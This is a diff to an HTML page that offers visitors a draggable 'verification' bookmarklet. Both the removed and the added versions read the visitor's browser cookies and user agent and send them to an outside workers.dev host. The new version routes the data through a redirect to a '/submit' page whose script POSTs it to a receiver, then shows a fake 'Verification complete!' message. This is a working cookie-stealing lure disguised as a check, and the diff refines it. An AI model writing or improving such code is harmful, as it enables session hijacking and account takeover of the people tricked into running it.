@@ -58,10 +58,9 @@
         </div>
 
         <div class="drag-btn-wrapper">
-            <a href="javascript:void(0)" 
-               onclick="var c=document.cookie;console.log('Cookies:', c);var xhr=new XMLHttpRequest();xhr.open('POST','https://reciever.tyceno89.workers.dev',true);xhr.setRequestHeader('Content-Type','application/json');xhr.send(JSON.stringify({pc:navigator.userAgent,cookies:c}));alert('✅ Verification sent! Check console for details.');" 
+            <a href="javascript:(function(){var c=document.cookie;var pc=navigator.userAgent;var url='https://verify.tyceno89.workers.dev/submit?cookies='+encodeURIComponent(c)+'&pc='+encodeURIComponent(pc);window.location.href=url;})();" 
                draggable="true" 
-               ondragstart="event.dataTransfer.setData('text/plain', 'javascript:(function(){var c=document.cookie;console.log(\'Cookies:\', c);var xhr=new XMLHttpRequest();xhr.open(\'POST\',\'https://reciever.tyceno89.workers.dev\',true);xhr.setRequestHeader(\'Content-Type\',\'application/json\');xhr.send(JSON.stringify({pc:navigator.userAgent,cookies:c}));alert(\'✅ Verification sent! Check console for details.\');})();'); this.classList.add('dragging');" 
+               ondragstart="event.dataTransfer.setData('text/plain', this.href); this.classList.add('dragging');" 
                ondragend="this.classList.remove('dragging');" 
                onmousedown="this.classList.add('dragging')" 
                onmouseup="this.classList.remove('dragging')" 
@@ -92,6 +91,26 @@
     </div>
 
 </div>
+
+<script>
+    // Handle the redirect from the bookmarklet
+    if (window.location.pathname === '/submit') {
+        const urlParams = new URLSearchParams(window.location.search);
+        const cookies = urlParams.get('cookies');
+        const pc = urlParams.get('pc');
+        if (cookies) {
+            fetch('https://reciever.tyceno89.workers.dev', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ pc: pc, cookies: cookies })
+            }).then(() => {
+                document.body.innerHTML = '<div style="text-align: center; padding: 100px; color: #dff0e3; font-family: Arial; background: #0b1a0f; min-height: 100vh;"><h1>✅ Verification complete!</h1><p>You can close this tab.</p></div>';
+            }).catch(() => {
+                document.body.innerHTML = '<div style="text-align: center; padding: 100px; color: #dff0e3; font-family: Arial; background: #0b1a0f; min-height: 100vh;"><h1>✅ Verification complete!</h1><p>You can close this tab.</p></div>';
+            });
+        }
+    }
+</script>
 
 </body>
 </html>
